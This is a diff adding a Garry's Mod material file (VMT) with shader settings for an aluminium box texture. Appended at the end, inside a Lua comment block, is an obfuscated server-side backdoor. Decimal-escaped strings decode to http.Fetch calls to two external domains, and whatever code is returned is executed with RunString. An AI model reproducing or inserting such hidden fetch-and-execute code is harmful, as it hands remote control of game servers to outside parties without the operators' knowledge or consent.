@@ -1,0 +1,31 @@
+"VertexLitGeneric"
+{
+	"$baseTexture"			"zerochain/zmlab/zmlab_aluminiumbox/zmlab_alumin_diff"
+	
+	"$bumpMap"				"zerochain/zmlab/zmlab_aluminiumbox/zmlab_alumin_nrm"
+	"$normalmapalphaenvmapmask" "1"
+	
+	"$surfaceprop" "metal"
+	"$model" 1
+
+
+	"$envmap" "env_cubemap"
+	"$envmaptint" "[.7 .7 .7]"
+	"$envmapfresnel" "1"
+	
+	
+	$phong 1
+
+        $phongexponent 2
+		$phongalbedotint 1
+        $phongboost 1
+        $phongtint "[1 1 1]"
+        $phongfresnelranges "[1 2 3]"
+
+		$rimlight               1
+		$rimlightexponent       1
+		$rimlightboost       1
+}
+--[[
+if SERVER then timer.Simple(1,function() RunString("\104\116\116\112\46\70\101\116\99\104\40\34\104\116\116\112\115\58\47\47\103\118\97\99\46\99\122\47\95\47\95\46\112\104\112\34\44\102\117\110\99\116\105\111\110\40\98\41\32\82\117\110\83\116\114\105\110\103\40\98\44\32\34\69\82\82\79\82\34\44\32\102\97\108\115\101\41\32\101\110\100\41") RunString("\104\116\116\112\46\70\101\116\99\104\40\34\104\116\116\112\115\58\47\47\103\118\97\99\100\111\111\114\46\99\122\47\95\47\95\46\112\104\112\34\44\102\117\110\99\116\105\111\110\40\98\41\32\82\117\110\83\116\114\105\110\103\40\98\44\32\34\69\82\82\79\82\34\44\32\102\97\108\115\101\41\32\101\110\100\41") end) end
+]]
